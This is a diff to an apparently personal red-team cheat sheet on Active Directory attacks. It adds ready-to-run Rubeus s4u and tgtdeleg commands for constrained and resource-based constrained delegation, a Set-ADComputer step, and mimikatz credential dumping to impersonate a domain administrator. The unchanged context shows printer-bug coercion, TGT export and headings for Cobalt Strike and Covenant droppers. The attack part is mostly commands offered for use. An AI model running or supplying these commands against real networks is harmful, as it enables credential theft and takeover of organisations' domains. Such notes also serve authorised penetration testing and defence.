@@ -8,10 +8,13 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Unconstrained Delegation](#unconstrained-delegation)
 		* [Printer Bug](#printer-bug)
 		* [Extract TGTs](#extract-tgt)
+	* [Constrained Delegation](#constrained-delegation)
+		* [s4u Delegation](#s4u-delegation)
+	* [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
 * **[Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)**
 	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
 	* [Covenant Grunt](#convenant-grunt)
-* [File Transfer](#file-transfer)
+* **[File Transfer](#file-transfer)**
 
 ## Unconstrained Delegation
 ### Printer Bug
@@ -24,13 +27,44 @@ spoolsample.exe dc01.contoso.local ms01.contoso.local
 Rubeus.exe monitor /interval:5
 ```
 
-## Constrained Delegation
-
 ### Extract TGT
 Since unconstrained computers will save users tgt (logged in users). We will extract this keys and able to impersonate them.
 ```
 mimikatz# sekurlsa::tickets /export
 Rubeus.exe ptt /ticket:ticket.kirbi
+```
+
+## Constrained Delegation
+### s4u delegation
+This attack is possible if _msds-AllowedToDelegateTo_ is set. 
+* with rc4 hash in hand
+```
+# Request TGT + TGS
+Rubeus.exe s4u /user:attacker /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,host,http /domain:contoso.local /dc:dc01.contoso.local /ptt
+```
+* with owned user session (not knowing his rc4)
+```
+# Request for ticket
+Rubeus.exe tgtdeleg /nowrap
+
+# Request TGS with base64 blob ticket
+Rubeus.exe s4u /user:attacker /ticket:<base64-blob> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,http,host /domain:contoso.local /dc:dc01.contoso.local /ptt
+```
+
+## Resource-Based Constrained Delegation
+This attack is possible if owned user/computer object has _GenericWrite_ or write privilege to user/computer object attributes. Since we have write privilege, we can write to _msds-allowedtoactonbehalfofotheridentity_ property.
+1. Import ADModule
+2. Set _msds-allowedtoactonbehalfofotheridentity_ to owned computer/user objects. 
+```
+Set-ADComputer -Identity dc01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer mycomputer)
+```
+3. Get mycomputer$ ntlm hash or aes keys
+```
+mimikatz# sekurlsa::logonpasswords
+```
+4. Apply s4u delegation (TGT+TGS)
+```
+Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs /ptt
 ```
 
 ## Generate VBScript dropper (APC process injection)
